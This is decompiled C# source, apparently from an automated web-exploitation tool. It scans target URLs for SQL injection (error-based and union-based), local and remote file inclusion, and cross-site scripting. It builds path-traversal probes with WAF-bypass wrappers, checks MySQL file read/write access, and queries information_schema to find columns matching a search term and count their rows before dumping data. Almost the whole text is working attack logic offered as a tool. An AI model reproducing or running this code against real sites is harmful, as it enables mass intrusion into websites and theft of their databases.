			Globals.WebServer webServer = (Globals.WebServer)checked((byte)class25_0.HTTP.WebServer());
			if (method_44("SQL") && (!Globals.DG_SQLi.method_10(class25_0.String_0) & !Globals.DG_SQLiNoInjectable.method_9(class25_0.String_0)))
			{
				method_37(class25_0, text);
			}
			if (!string.IsNullOrEmpty(text) && !Conversions.ToBoolean(Operators.AndObject(Globals.GetObjectValue(chkSkipHttpStatus4xx), num2 > 399)))
			{
				if (method_44("XSS") && !Globals.DG_FileInclusao.method_10(class25_0.String_0))
				{
					method_40(class25_0, text);
				}
				if (method_44("LFI") && webServer != Globals.WebServer.UNKNOW && !Globals.DG_FileInclusao.method_10(class25_0.String_0))
				{
					method_38(class25_0, webServer, text);
				}
				if (method_44("RFI") && !Globals.DG_FileInclusao.method_10(class25_0.String_0))
				{
					method_39(class25_0, webServer, text);
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			method_24(exception_);
			ProjectData.ClearProjectError();
		}
		finally
		{
			try
			{
				if (AppControlDomain != null)
				{
					AppControlDomain.Dispose(class25_0.HTTP);
				}
				if (!method_23())
				{
					if (enum6_0 == Enum6.const_2)
					{
						_ = 1;
						Globals.GQueue.method_5(class25_0.String_0);
					}
					if (string.IsNullOrEmpty(class25_0.String_1) & string.IsNullOrEmpty(class25_0.String_2) & string.IsNullOrEmpty(class25_0.String_3))
					{
						_ = 1;
						Globals.GTrash.method_0(class25_0.String_0);
					}
					if (threadPool_0 != null && class25_0 != null)
					{
						threadPool_0.Close(class25_0.Thread);
					}
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Exception exception_2 = ex2;
				method_24(exception_2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private bool method_37(Class25 class25_0, string string_5)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		checked
		{
			int num = lstAnalizerError.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				if (lstAnalizerError.GetItemChecked(i))
				{
					string item = Conversions.ToString(lstAnalizerError.Items[i]);
					list2.Add(item);
				}
			}
			int num2 = lstAnalizerUnion.Items.Count - 1;
			for (int j = 0; j <= num2; j++)
			{
				if (lstAnalizerUnion.GetItemChecked(j))
				{
					string item = Conversions.ToString(lstAnalizerUnion.Items[j]);
					list.Add(item);
				}
			}
			Analyzer analyzer = new Analyzer(class25_0.String_0, 2, class25_0.HTTP);
			analyzer.OnProgress += method_42;
			analyzer.VectorsUnion = list;
			analyzer.VectorsError = list2;
			analyzer.HtmlOriginalShowSQL = analyzer.IsExploitable(string_5);
			analyzer.SkipMsAcessAndSybase = Conversions.ToBoolean(Globals.GetObjectValue(chkAnalizeMsAcessSybase));
			string text = "";
			Types dBType = Types.None;
			string text2 = "";
			if (string.IsNullOrEmpty(string_5))
			{
				string_5 = analyzer.HTML_Load(class25_0.String_0);
			}
			Types types = analyzer.CheckExploit();
			analyzer.UnionKeyword = Class54.smethod_11(types);
			bool flag = default(bool);
			if (analyzer.IsExploitable(types))
			{
				if (analyzer.SkipMsAcessAndSybase & ((analyzer.DBType == Types.MsAccess) | (analyzer.DBType == Types.Sybase)))
				{
					struct10_0.int_4++;
					Globals.DG_SQLiNoInjectable.method_1(new string[5]
					{
						class25_0.String_0,
						Class54.smethod_5(types),
						"",
						DateAndTime.Now.ToString(CultureInfo.InvariantCulture),
						""
					});
					class25_0.String_3 = class25_0.String_0;
					return false;
				}
				if (analyzer.TryErrorBasead())
				{
					text = analyzer.Version;
					dBType = analyzer.DBType;
					class25_0.String_3 = analyzer.ResultError;
					flag = true;
				}
				bool flag2;
				if ((flag2 = true) == Globals.DG_SQLi.method_10(class25_0.String_0))
				{
					return true;
				}
				if (Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectEqual(flag2, Operators.AndObject(Class54.smethod_9(analyzer.DBType), Globals.GetObjectValue(chkAnalizerMySQLErrorUnion)), TextCompare: false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag2, Operators.AndObject(Class54.smethod_10(analyzer.DBType), Globals.GetObjectValue(chkAnalizerMSSQLErrorUnion)), TextCompare: false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag2, Operators.AndObject(Class54.smethod_11(analyzer.DBType), Globals.GetObjectValue(chkAnalizerOracleErrorUnion)), TextCompare: false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag2, Operators.AndObject(Class54.smethod_12(analyzer.DBType), Globals.GetObjectValue(chkAnalizerPostgreErrorUnion)), TextCompare: false)) || flag2 == (!flag & !method_23())))
				{
					analyzer.UnionKeyword = unchecked(Class54.smethod_11(types) || flag);
					if (analyzer.TryUnionBasead())
					{
						flag = true;
						if (analyzer.ResultUnionColumn > 0)
						{
							class25_0.String_3 = analyzer.ResultUnion;
							text = analyzer.Version;
						}
						else if (!string.IsNullOrEmpty(analyzer.ResultError))
						{
							analyzer.DBType = dBType;
							class25_0.String_3 = analyzer.ResultError;
						}
						else
						{
							flag = false;
						}
					}
					else
					{
						analyzer.DBType = dBType;
					}
				}
				if ((flag & !method_23()) && Class54.smethod_9(analyzer.DBType) && Conversions.ToBoolean(Globals.GetObjectValue(chkAnalizeMySQLReadWrite)) && !string.IsNullOrEmpty(analyzer.Version))
				{
					string sReadPath = "";
					string sWritePath = "";
					if (analyzer.CheckMySQL_File(class25_0.String_3, ref sReadPath, ref sWritePath))
					{
						text2 = Globals.translate_0.GetStr(this, 84);
						if (!string.IsNullOrEmpty(sWritePath))
						{
							text2 = text2 + Globals.translate_0.GetStr(this, 85) + " " + sWritePath + " ";
						}
						if (!string.IsNullOrEmpty(sReadPath))
						{
							text2 = text2 + Globals.translate_0.GetStr(this, 86) + " " + sReadPath;
						}
					}
				}
				if (flag)
				{
					if (!Globals.DG_SQLi.method_10(class25_0.String_0))
					{
						struct10_0.int_3++;
						if (string.IsNullOrEmpty(text))
						{
							text = Globals.translate_0.GetStr(this, 87);
						}
						Globals.DG_SQLi.method_1(new string[7]
						{
							class25_0.String_3,
							Class54.smethod_5(analyzer.DBType),
							text,
							text2,
							"",
							"",
							DateAndTime.Now.ToString(CultureInfo.InvariantCulture)
						});
					}
				}
				else if (!method_23())
				{
					if (analyzer.HtmlOriginalShowSQL)
					{
						class25_0.String_3 = "";
					}
					else
					{
						struct10_0.int_4++;
						Globals.DG_SQLiNoInjectable.method_1(new string[5]
						{
							class25_0.String_0,
							Class54.smethod_5(types),
							"",
							DateAndTime.Now.ToString(CultureInfo.InvariantCulture),
							""
						});
					}
				}
				class25_0.String_3 = class25_0.String_0;
			}
			return flag;
		}
	}

	private bool method_38(Class25 class25_0, Globals.WebServer webServer_0, string string_5)
	{
		Dictionary<string, string> dictionary_ = new Dictionary<string, string>();
		int num = Conversions.ToInteger(Globals.GetObjectValue(numHTTPRetry));
		int int_ = Conversions.ToInteger(Globals.GetObjectValue(numExploitingDelay));
		checked
		{
			switch (webServer_0)
			{
			case Globals.WebServer.LINUX:
				foreach (ListViewItem item in (IEnumerable)Globals.GetObjectValue(lvwLFIpathLinux))
				{
					string text = item.SubItems[1].Text.Trim();
					if (string_5.ToLower().Contains(text.ToLower()))
					{
						continue;
					}
					string key = item.Text;
					method_43(key, text, ref dictionary_);
					int num2 = Conversions.ToInteger(Operators.SubtractObject(Globals.GetObjectValue(numLFIpathTraversalCount), 1));
					for (int i = 1; i <= num2; i++)
					{
						key = "";
						int num3 = 1;
						do
						{
							key = (((num3 == i) & item.Text.StartsWith("/")) ? (key + "..") : (key + "../"));
							if (num3 >= i)
							{
								break;
							}
							num3++;
						}
						while (num3 <= 100);
						key += item.Text;
						method_43(key, text, ref dictionary_);
					}
				}
				break;
			case Globals.WebServer.WINDOWS:
				if (Conversions.ToBoolean(Globals.GetObjectValue(chkLfiWindowsSkip)))
				{
					return false;
				}
				foreach (ListViewItem item2 in (IEnumerable)Globals.GetObjectValue(lvwLFIpathWin))
				{
					string key = item2.Text;
					string text = item2.SubItems[1].Text.Trim();
					if (!string_5.ToLower().Contains(text.ToLower()))
					{
						dictionary_.Add(key, text);
						dictionary_.Add(Class23.smethod_7(key), text);
					}
				}
				break;
			}
			if (dictionary_.Count == 0)
			{
				return false;
			}
			Stopwatch stopwatch_ = Stopwatch.StartNew();
			class25_0.HTTP.FollowRedirects = true;
			List<string> list = Class23.smethod_16(class25_0.String_0, "[t]", bool_0: true);
			foreach (string item3 in list)
			{
				if (!method_23())
				{
					int num4 = 0;
					do
					{
						if (num4 != 0)
						{
							if (!Conversions.ToBoolean(Globals.GetObjectValue(chkExploitIgnoreCookies)))
							{
								break;
							}
							class25_0.HTTP.SetAcceptCookies(b: false);
						}
						foreach (KeyValuePair<string, string> item4 in dictionary_)
						{
							string url = item3.Replace("[t]", item4.Key);
							int num5 = num;
							int num6 = 0;
							while (true)
							{
								if (num6 <= num5)
								{
									method_42(null, Class23.smethod_11(class25_0.String_0) + " " + Globals.translate_0.GetStr(this, 82) + item4.Key, -1);
									method_41(stopwatch_, int_);
									if (!class25_0.HTTP.CheckKeyword(url, item4.Value))
									{
										int num7 = class25_0.HTTP.Status();
										stopwatch_ = Stopwatch.StartNew();
										if (num7 <= 0)
										{
											if (num6 < num)
											{
												if (!method_23())
												{
													num6++;
													continue;
												}
												return false;
											}
											return false;
										}
										goto end_IL_0446;
									}
									class25_0.String_1 = url;
									struct10_0.int_0++;
									Globals.DG_FileInclusao.method_1(new string[4]
									{
										class25_0.String_1,
										"LFI",
										"",
										DateAndTime.Now.ToString(CultureInfo.InvariantCulture)
									});
									Globals.GStatistics.method_1(Class26.Enum1.const_1, item4.Key, 1);
									return true;
								}
								if (!method_23())
								{
									break;
								}
								return false;
							}
						}
						num4++;
						continue;
						end_IL_0446:
						break;
					}
					while (num4 <= 1);
					continue;
				}
				return false;
			}
			return false;
		}
	}

	private bool method_39(Class25 class25_0, Globals.WebServer webServer_0, string string_5)
	{
		string text = Conversions.ToString(Globals.GetObjectValue(txtRFIurl));
		int num = Conversions.ToInteger(Globals.GetObjectValue(numHTTPRetry));
		int int_ = Conversions.ToInteger(Globals.GetObjectValue(numExploitingDelay));
		string text2 = Conversions.ToString(Globals.GetObjectValue(txtRFIkeyword));
		text2 = text2.ToLower();
		text2 = text2.Trim();
		if (string_5.ToLower().Contains(text2.ToLower()))
		{
			return false;
		}
		text = Class23.smethod_7(text);
		Stopwatch stopwatch_ = Stopwatch.StartNew();
		List<string> list = Class23.smethod_16(class25_0.String_0, text, bool_0: true);
		class25_0.HTTP.FollowRedirects = false;
		checked
		{
			foreach (string item in list)
			{
				if (!method_23())
				{
					int num2 = num;
					for (int i = 0; i <= num2; i++)
					{
						method_41(stopwatch_, int_);
						method_42(null, Class23.smethod_11(class25_0.String_0) + " " + Globals.translate_0.GetStr(this, 83), -1);
						if (!class25_0.HTTP.CheckKeyword(item, text2))
						{
							int num3 = class25_0.HTTP.Status();
							stopwatch_ = Stopwatch.StartNew();
							if (num3 > 0)
							{
								break;
							}
							if (i < num)
							{
								if (method_23())
								{
									return false;
								}
								continue;
							}
							return false;
						}
						class25_0.String_2 = item;
						struct10_0.int_1++;
						Globals.DG_FileInclusao.method_1(new string[4]
						{
							class25_0.String_2,
							"RFI",
							"",
							DateAndTime.Now.ToString(CultureInfo.InvariantCulture)
						});
						return true;
					}
					continue;
				}
				return false;
			}
			return true;
		}
	}

	private bool method_40(Class25 class25_0, string string_5)
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		int num = Conversions.ToInteger(Globals.GetObjectValue(numHTTPRetry));
		int int_ = Conversions.ToInteger(Globals.GetObjectValue(numExploitingDelay));
		foreach (ListViewItem item in (IEnumerable)Globals.GetObjectValue(lvwXSS))
		{
			string key = item.Text;
			string text = item.SubItems[1].Text;
			if (!string_5.ToLower().Contains(text.ToLower()))
			{
				dictionary.Add(key, text);
				dictionary.Add(Class23.smethod_7(key), text);
			}
		}
		if (dictionary.Count == 0)
		{
			return false;
		}
		Stopwatch stopwatch_ = Stopwatch.StartNew();
		class25_0.HTTP.FollowRedirects = true;
		List<string> list = Class23.smethod_16(class25_0.String_0, "[t]", bool_0: true);
		checked
		{
			foreach (string item2 in list)
			{
				if (method_23())
				{
					return false;
				}
				foreach (KeyValuePair<string, string> item3 in dictionary)
				{
					string url = item2.Replace("[t]", item3.Key);
					int num2 = num;
					int num3 = 0;
					while (true)
					{
						if (num3 <= num2)
						{
							method_42(null, Class23.smethod_11(class25_0.String_0) + " " + Globals.translate_0.GetStr(this, 116) + item3.Key, -1);
							method_41(stopwatch_, int_);
							if (!class25_0.HTTP.CheckKeyword(url, item3.Value))
							{
								int num4 = class25_0.HTTP.Status();
								stopwatch_ = Stopwatch.StartNew();
								if (num4 <= 0)
								{
									if (num3 < num)
									{
										if (!method_23())
										{
											num3++;
											continue;
										}
										return false;
									}
									return false;
								}
								goto end_IL_01ec;
							}
							class25_0.String_4 = url;
							struct10_0.int_2++;
							Globals.DG_FileInclusao.method_1(new string[4]
							{
								class25_0.String_4,
								"XSS",
								"",
								DateAndTime.Now.ToString(CultureInfo.InvariantCulture)
							});
							Globals.GStatistics.method_1(Class26.Enum1.const_0, item3.Key, 1);
							return true;
						}
						if (!method_23())
						{
							break;
						}
						return false;
					}
					continue;
					end_IL_01ec:
					break;
				}
			}
			return false;
		}
	}

	private void method_41(Stopwatch stopwatch_1, int int_14)
	{
		while (!method_23())
		{
			Thread.Sleep(100);
			if (int_14 <= stopwatch_1.ElapsedMilliseconds)
			{
				break;
			}
		}
	}

	private void method_42(Analyzer analyzer_0, string string_5, int int_14)
	{
		checked
		{
			if (!bcWorker.CancellationPending && threadPool_0 != null && threadPool_0.ThreadCount == 1)
			{
				if (analyzer_0 != null)
				{
					method_1("[ " + Globals.FormatNumbers(int_0 + 1) + "] " + analyzer_0.GetDomain + " " + Globals.translate_0.GetStr(this, 29) + string_5);
				}
				else
				{
					method_1("[ " + Globals.FormatNumbers(int_0 + 1) + "] " + Globals.translate_0.GetStr(this, 29) + string_5);
				}
			}
		}
	}

	private void method_43(string string_5, string string_6, ref Dictionary<string, string> dictionary_2)
	{
		dictionary_2.Add(string_5, string_6);
		dictionary_2.Add(Class23.smethod_7(string_5), string_6);
		foreach (ListViewItem item in (IEnumerable)Globals.GetObjectValue(lvwWafs))
		{
			dictionary_2.Add(item.Text + string_5 + item.SubItems[1].Text, string_6);
			dictionary_2.Add(item.Text + Class23.smethod_7(string_5) + item.SubItems[1].Text, string_6);
		}
	}

	private bool method_44(string string_5)
	{
		checked
		{
			int num = lstExpoitType.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				if (lstExpoitType.Items[i].ToString().Equals(string_5))
				{
					return lstExpoitType.GetItemChecked(i);
				}
			}
			bool result = default(bool);
			return result;
		}
	}

	private void method_45()
	{
		if (enum6_0 == Enum6.const_0 || ReExploiterForm == null)
		{
			return;
		}
		if (base.InvokeRequired)
		{
			Invoke(new Delegate49(method_45));
			return;
		}
		checked
		{
			lock (ReExploiterForm)
			{
				if (!ReExploiterForm.lvwUnCheckeds.Visible)
				{
					ReExploiterForm.Size = new Size(ReExploiterForm.lvwUnCheckeds.Columns[0].Width + ReExploiterForm.lvwUnCheckeds.Columns[1].Width + 30, 250);
					ReExploiterForm.lvwUnCheckeds.Visible = true;
					ReExploiterForm.Top = (int)Math.Round((double)Globals.GMain.Top + (double)Globals.GMain.Height / 2.0 - (double)ReExploiterForm.Height / 2.0);
					ReExploiterForm.Left = (int)Math.Round((double)Globals.GMain.Left + (double)Globals.GMain.Width / 2.0 - (double)ReExploiterForm.Width / 2.0);
					ReExploiterForm.FormBorderStyle = FormBorderStyle.SizableToolWindow;
					ReExploiterForm.CanClose = false;
					ReExploiterForm.Show(this);
				}
			}
		}
	}

	private void method_46(Class49 class49_0)
	{
		checked
		{
			HTTPExt hTTP = default(HTTPExt);
			try
			{
				Types dBType = Class54.smethod_6(Conversions.ToString(class49_0.Item.Cells[2].Value));
				lock (AppControlDomain)
				{
					hTTP = AppControlDomain.GetHTTP();
				}
				Analyzer analyzer = new Analyzer(class49_0.String_0, 2, hTTP);
				analyzer.DBType = dBType;
				class49_0.o = analyzer;
				Globals.DG_SQLi.method_3("", 5, class49_0.Item);
				Globals.DG_SQLi.method_3(DateAndTime.Now.ToString(), 6, class49_0.Item);
				if (analyzer.CheckVersionNoCollactions(class49_0.String_0, checkRedirects: true))
				{
					struct10_0.int_3++;
				}
				else if (!bcWorker.CancellationPending)
				{
					method_45();
					ReExploiterForm.Add(class49_0.Item);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception_ = ex;
				method_24(exception_);
				ProjectData.ClearProjectError();
			}
			finally
			{
				try
				{
					if (AppControlDomain != null)
					{
						AppControlDomain.Dispose(hTTP);
					}
					if (!bcWorker.CancellationPending && threadPool_0 != null && class49_0 != null)
					{
						threadPool_0.Close(class49_0.Thread);
					}
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2);
					Exception exception_2 = ex2;
					method_24(exception_2);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void method_47()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 223:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0014;
						case 5:
							goto IL_002b;
						case 7:
							goto IL_0038;
						case 9:
							goto IL_0045;
						case 11:
							goto IL_0055;
						case 13:
							goto IL_0065;
						case 14:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
						case 6:
						case 8:
						case 10:
						case 12:
						case 15:
						case 16:
						case 17:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0045:
					num = 9;
					if (searchColumn_0.Visible)
					{
						goto end_IL_0001_3;
					}
					goto IL_0055;
					IL_0055:
					num = 11;
					if (bcWorker.CancellationPending)
					{
						goto end_IL_0001_3;
					}
					goto IL_0065;
					IL_0038:
					num = 7;
					if (enum6_0 == Enum6.const_0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0045;
					IL_0065:
					num = 13;
					if (searchColumn_0.Visible)
					{
						goto end_IL_0001_3;
					}
					break;
					IL_000a:
					num = 2;
					if (base.InvokeRequired)
					{
						goto IL_0014;
					}
					goto IL_002b;
					IL_0014:
					num = 3;
					Invoke(new Delegate49(method_47));
					goto end_IL_0001_3;
					IL_002b:
					num = 5;
					if (searchColumn_0 == null)
					{
						goto end_IL_0001_3;
					}
					goto IL_0038;
					end_IL_0001_2:
					break;
				}
				num = 14;
				searchColumn_0.ShowMe();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 223;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_48(Class49 class49_0)
	{
		checked
		{
			HTTPExt hTTP = default(HTTPExt);
			try
			{
				Types dBType = Class54.smethod_6(Conversions.ToString(class49_0.Item.Cells[2].Value));
				string text = "";
				if (class49_0.Int32_0 == 0)
				{
					method_1(Globals.translate_0.GetStr(DumperForm, 5));
				}
				hTTP = AppControlDomain.GetHTTP();
				Analyzer analyzer = new Analyzer(class49_0.String_0, 2, hTTP);
				analyzer.DBType = dBType;
				class49_0.o = analyzer;
				if (analyzer.CheckVersionNoCollactions(class49_0.String_0))
				{
					DataSearch dataSearch = new DataSearch(class49_0.String_0, analyzer, IsDumper: false);
					dataSearch.CurrentDB = class49_0.CurrentDB;
					if (threadPool_0.ThreadCount == 1)
					{
						dataSearch.OnProgress += method_49;
					}
					dataSearch.SearchColumn(class49_0.Search);
					if (dataSearch.Result.Count > 0)
					{
						text = Globals.translate_0.GetStr(this, 91) + " '" + class49_0.Search + "' " + Globals.translate_0.GetStr(this, 92) + " " + Strings.FormatNumber(dataSearch.RowsCount, 0) + ", " + Globals.translate_0.GetStr(this, 93) + " " + Strings.FormatNumber(dataSearch.Result.Count, 0) + " " + Globals.translate_0.GetStr(this, 94) + " ";
						foreach (string item in dataSearch.Result)
						{
							text = text + "; " + item;
						}
						lock (searchColumn_0)
						{
							searchColumn_0.method_1(class49_0.String_0, Class54.smethod_5(class49_0.o.DBType), class49_0.Search, dataSearch.RowsCount, dataSearch.Result);
						}
						struct10_0.int_3 += dataSearch.RowsCount;
					}
					else if (dataSearch.RetyFailed)
					{
						Globals.DG_SQLi.method_3(Globals.translate_0.GetStr(this, 95), 6, class49_0.Item);
					}
					Globals.DG_SQLi.method_3(text, 5, class49_0.Item);
					if (!string.IsNullOrEmpty(text))
					{
						method_47();
					}
				}
				else
				{
					Globals.DG_SQLi.method_3(Globals.translate_0.GetStr(this, 88), 5, class49_0.Item);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception_ = ex;
				method_24(exception_);
				ProjectData.ClearProjectError();
			}
			finally
			{
				try
				{
					if (!bcWorker.CancellationPending)
					{
						if (AppControlDomain != null)
						{
							AppControlDomain.Dispose(hTTP);
						}
						if (threadPool_0 != null && class49_0 != null)
						{
							threadPool_0.Close(class49_0.Thread);
						}
					}
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2);
					Exception exception_2 = ex2;
					method_24(exception_2);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void method_49(int int_14, string string_5)
	{
		int_1 = int_14;
		bcWorker.ReportProgress(int_14);
		method_1(string_5);
		method_29(ProgressBarStyle.Blocks);
	}

	private string method_50(Class49 class49_0)
	{
		string text = "";
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		if (_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init, ref lockTaken);
			if (_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init.State == 0)
			{
				_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init.State = 2;
				_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS = new Dictionary<string, List<string>>();
			}
			else if (_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init);
			}
		}
		if (_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS.ContainsKey(class49_0.String_0))
		{
			list2 = _0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS[class49_0.String_0];
		}
		List<string> list3 = new List<string>();
		string[] array = new string[2];
		string text2 = "";
		List<string> list4 = new List<string>();
		checked
		{
			long num5 = default(long);
			int num = default(int);
			InjectionType oError = default(InjectionType);
			int num2 = default(int);
			switch (class49_0.o.DBType)
			{
			case Types.MySQL_No_Error:
			case Types.MySQL_With_Error:
			{
				list3.AddRange(new string[2] { "d.schema_name", "t.table_name" });
				string text4 = "from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) " + (class49_0.CurrentDB ? "and d.schema_name = database() " : " ") + "and c.column_name like " + Class23.smethod_20("%" + class49_0.Search + "%") + " # group by t.table_name";
				int num3 = method_52(class49_0, class49_0.String_0, "t.table_name", text4.Replace("group by t.table_name", "").Replace("#", ""));
				text4 += " limit [x],[y]";
				if (num3 == 0)
				{
					return "";
				}
				if (class49_0.o.DBType == Types.MySQL_No_Error)
				{
					text4 = text4.Replace("#", "");
					while (true)
					{
						if (threadPool_0.ThreadCount == 1)
						{
							method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 7) + " " + class49_0.SearchType.ToString() + " '" + class49_0.Search + "' [" + Globals.translate_0.GetStr(this, 89) + " " + Conversions.ToString(num2 + 1) + "/" + Conversions.ToString(num3) + " | " + Class23.smethod_11(class49_0.String_0));
						}
						string string_ = MySQLNoError.Dump(class49_0.String_0, unchecked((MySQLCollactions)(0u - (class49_0.o.MSSQLCollate ? 1u : 0u))), bHexEncoded: false, bIFNULL: false, "", "", list3, num2, 1, "", "", "", text4);
						Class54.smethod_1(ref string_);
						if (method_23())
						{
							break;
						}
						string text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
						if (!string.IsNullOrEmpty(text3))
						{
							List<string> list6 = DumperForm.method_17(text3, class49_0.o.DBType);
							if (list6.Count <= 0)
							{
								break;
							}
							array = Strings.Split(list6[0], Class54.string_2);
							if (array.Length <= 1 || list4.Contains(array[1]))
							{
								break;
							}
							string string_2 = "from " + array[0] + "." + array[1];
							int num4 = method_52(class49_0, class49_0.String_0, "*", string_2);
							if (num4 > 0)
							{
								string item = "[" + Strings.FormatNumber(num4, 0) + "] " + array[0] + "." + array[1];
								list.Add(item);
								list4.Add(array[1]);
								num5 += num4;
							}
							num = 0;
							num2++;
							if (!class49_0.AllResults || num2 > num3)
							{
								break;
							}
						}
						else
						{
							num++;
							if (num >= class49_0.Retry)
							{
								break;
							}
						}
					}
				}
				else if (class49_0.o.DBType == Types.MySQL_With_Error)
				{
					string text5 = text4;
					List<string> list7 = new List<string>();
					int num6 = num3 - 1;
					for (num2 = 0; num2 <= num6; num2++)
					{
						if (list7.Count > 0)
						{
							string text6 = " and not t.table_name in (";
							int num7 = list7.Count - 1;
							for (int i = 0; i <= num7; i++)
							{
								if (i != 0)
								{
									text6 += ",";
								}
								text6 += Class23.smethod_20(list7[i]);
							}
							text6 += ")";
							text4 = text5.Replace("#", text6);
						}
						else
						{
							text4 = text5.Replace("#", "");
						}
						int num8 = 0;
						do
						{
							if (!unchecked((class49_0.CurrentDB & !string.IsNullOrEmpty(text2)) && num8 == 0))
							{
								if (threadPool_0.ThreadCount == 1)
								{
									method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 7) + " " + class49_0.SearchType.ToString() + " '" + class49_0.Search + "' [" + Globals.translate_0.GetStr(this, 89) + " " + Conversions.ToString(num2 + 1) + "/" + Conversions.ToString(num3) + "] [" + Conversions.ToString(num8 + 1) + "/2] | " + Class23.smethod_11(class49_0.String_0));
								}
								list3.Clear();
								switch (num8)
								{
								case 1:
									list3.Add("t.table_name");
									break;
								case 0:
									list3.Add("d.schema_name");
									break;
								}
								string string_ = MySQLWithError.Dump(class49_0.String_0, class49_0.o.MySQLCollactions, class49_0.o.MySQLErrorType, bIFNULL: false, "", "", list3, num2, 1, "", "", "", text4);
								Class54.smethod_1(ref string_);
								if (method_23())
								{
									break;
								}
								string text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
								if (!string.IsNullOrEmpty(text3))
								{
									List<string> list8 = Class2.Class3_0.Dumper_0.method_17(text3, class49_0.o.DBType);
									if (list8.Count <= 0)
									{
										break;
									}
									array[num8] = list8[0];
									if (num8 == 1)
									{
										if (list4.Contains(array[1]))
										{
											break;
										}
										list4.Add(array[1]);
									}
									if (num8 == 0)
									{
										text2 = list8[0];
									}
									num = 0;
								}
								else
								{
									num++;
									if (num >= class49_0.Retry)
									{
										break;
									}
								}
							}
							else
							{
								array[0] = text2;
							}
							num8++;
						}
						while (num8 <= 1);
						if (string.IsNullOrEmpty(array[0]) || string.IsNullOrEmpty(array[1]))
						{
							break;
						}
						string string_3 = "from " + array[0] + "." + array[1];
						int num4 = method_52(class49_0, class49_0.String_0, "*", string_3);
						if (num4 > 0)
						{
							string item2 = "[" + Strings.FormatNumber(num4, 0) + "] " + array[0] + "." + array[1];
							list.Add(item2);
							list7.Add(array[1]);
							num5 += num4;
						}
						array = new string[3];
						if (!class49_0.AllResults)
						{
							break;
						}
					}
				}
				goto default;
			}
			case Types.MSSQL_No_Error:
			case Types.MSSQL_With_Error:
				switch (class49_0.o.DBType)
				{
				case Types.MSSQL_With_Error:
					oError = InjectionType.Error;
					break;
				case Types.MSSQL_No_Error:
					oError = InjectionType.Union;
					break;
				}
				if (list2.Count == 0)
				{
					List<string> list5;
					string text3;
					while (true)
					{
						if (threadPool_0.ThreadCount == 1)
						{
							method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 7) + " " + class49_0.SearchType.ToString() + " '" + class49_0.Search + "' " + Globals.translate_0.GetStr(this, 90) + " | " + Class23.smethod_11(class49_0.String_0));
						}
						list5 = new List<string>();
						list5.Add("DB_NAME()");
						string string_ = MSSQL.Info(class49_0.String_0, oError, class49_0.o.MSSQLCollate, list5, class49_0.o.MSSQLCast);
						Class54.smethod_1(ref string_);
